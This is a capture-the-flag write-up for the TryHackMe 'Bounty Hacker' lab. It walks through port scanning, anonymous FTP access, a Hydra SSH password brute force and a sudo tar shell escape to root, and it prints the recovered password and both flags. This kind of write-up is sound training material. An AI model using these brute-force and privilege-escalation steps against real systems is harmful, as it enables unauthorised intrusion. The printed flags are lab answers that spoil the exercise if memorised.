# Bounty Hacker

<div align="left">

<figure><img src="../.gitbook/assets/9ad38a2cc31d6ae0030c888aca7fe646.jpeg" alt="" width="188"><figcaption><p>tryhackme.com - © TryHackMe</p></figcaption></figure>

</div>

🔗 [Bounty Hacker](https://tryhackme.com/room/cowboyhacker)

### Task 1 - Deploy the machine

🎯 Target IP: `10.10.218.233`

Create a directory for machine on the Desktop and a directory containing the scans with nmap.

### Task 2 - Reconnaissance

```bash
su
echo "10.10.104.152 bounty.thm" >> /etc/hosts

mkdir thm/bounty.thm  
cd thm/bounty.thm

# At the end of the room
# To clean up the last line from the /etc/hosts file
sed -i '$ d' /etc/hosts
```

I prefer to start recon by pinging the target, this allows us to check connectivity and get OS info.

```bash
ping -c 3 bounty.thm
PING bounty.thm (10.10.104.152) 56(84) bytes of data.
64 bytes from bounty.thm (10.10.104.152): icmp_seq=1 ttl=63 time=62.0 ms
64 bytes from bounty.thm (10.10.104.152): icmp_seq=2 ttl=63 time=61.5 ms
64 bytes from bounty.thm (10.10.104.152): icmp_seq=3 ttl=63 time=60.7 ms
```

Sending these three ICMP packets, we see that the Time To Live (TTL) is \~64 secs. this indicates that the target is a \*nix system (probably Linux), while Windows systems usually have a TTL of 128 secs.

#### 2.1 - Find open ports on the machine

```bash
nmap --open -n -Pn -vvv bounty.thm
```

```bash
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-24 09:06 EDT
Initiating SYN Stealth Scan at 09:06
Scanning bounty.thm (10.10.104.152) [1000 ports]
Discovered open port 21/tcp on 10.10.104.152
Discovered open port 22/tcp on 10.10.104.152
Discovered open port 80/tcp on 10.10.104.152
Completed SYN Stealth Scan at 09:06, 4.44s elapsed (1000 total ports)
Nmap scan report for bounty.thm (10.10.104.152)
Host is up, received user-set (0.077s latency).
Scanned at 2023-06-24 09:06:30 EDT for 4s
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

<table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sudo</td><td>run as root</td></tr><tr><td>sC</td><td>run default scripts</td></tr><tr><td>sV</td><td>enumerate versions</td></tr><tr><td>A</td><td>aggressive mode</td></tr><tr><td>T4</td><td>run a bit faster</td></tr><tr><td>oN</td><td>output to file with nmap formatting</td></tr></tbody></table>

```bash
nmap -p21,22,80 -sCV -A -T4 -v -oN open_ports bounty.thm  
```

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.80.228
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (89%), Linux 3.2 (89%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (89%), HP P2000 G3 NAS device (89%), Crestron XPanel control system (88%), Adtran 424RG FTTH gateway (88%), Linux 2.6.32 (88%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (88%), Linux 3.1 - 3.2 (88%), Linux 3.11 (88%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 43.779 days (since Thu May 11 14:30:03 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=255 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   61.74 ms 10.9.0.1
2   61.50 ms bounty.thm (10.10.104.152)

```

It looks like there are only three open ports on the machine.

We just see a good info: tp-anon: Anonymous FTP login allowed (FTP code 230), then, we can try to log with ftp.

#### 2.2 - Who wrote the task list?

We try to access with ftp

```bash
cted to bounty.thm.
220 (vsFTPd 3.0.3)
Name (bounty.thm:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

We use anonymous login (without psw)

```bash
ftp> ls
229 Entering Extended Passive Mode (|||21660|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jun 07  2020 .
drwxr-xr-x    2 ftp      ftp          4096 Jun 07  2020 ..
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> get locks.txt
local: locks.txt remote: locks.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
100% |*************************************************************************************|   418        6.09 KiB/s    00:00 ETA
226 Transfer complete.
418 bytes received in 00:00 (3.19 KiB/s)
ftp> get task.txt
local: task.txt remote: task.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |*************************************************************************************|    68        0.58 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.38 KiB/s)
ftp> close
221 Goodbye.
ftp> exit
```

We get two .txt files to read them.

_locks.txt_

```bash
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```

_task.txt_

```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

Reading task.txt file we can say that the owner of task list is Lin.

{% hint style="info" %}
lin
{% endhint %}

#### 2.2 - What service can you bruteforce with the text file found?

The locks.txt file maybe cointains a password list, we know that "lin" is a user and lounch a brute force attack on port 22 (SSH).\


{% hint style="info" %}
SSH
{% endhint %}

#### 2.3 - What is the users flag?&#x20;

```bash
hydra -l lin -P locks.txt bounty.thm ssh
```

```bash
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-24 09:35:42
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://bounty.thm:22/
[22][ssh] host: bounty.thm   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
```

{% hint style="info" %}
```
RedDr4gonSynd1cat3
```
{% endhint %}

We can use the credentials obtained for ssh access:

```
lin::RedDr4gonSynd1cat3
```

```bash
ssh lin@bounty.thm
The authenticity of host 'bounty.thm (10.10.104.152)' can't be established.
ED25519 key fingerprint is SHA256:Y140oz+ukdhfyG8/c5KvqKdvm+Kl+gLSvokSys7SgPU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'bounty.thm' (ED25519) to the list of known hosts.
lin@bounty.thm's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)
```

```bash
lin@bountyhacker:~/Desktop$ ls
user.txt
lin@bountyhacker:~/Desktop$ cat user.txt
```

<details>

<summary>🚩 Flag 1 (user.txt)</summary>

THM{CR1M3\_SyNd1C4T3}

</details>

#### 2.4 - What is the root flag?

Now, we need to get root permissions to explore the root folder.

We can use sudo -l command to find process with root priviledge:

```bash
lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

In this case only: /bin/tar, we find this script on gtfobins website to became a root: [https://gtfobins.github.io/gtfobins/tar/](https://gtfobins.github.io/gtfobins/tar/)

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

```bash
# whoami
root
```

Now, we're root!

```bash
# cd /root/
# ls
root.txt
# cat root.txt
```

<details>

<summary>🚩 Flag 2 (root.txt)</summary>

THM{80UN7Y\_h4cK3r}

</details>
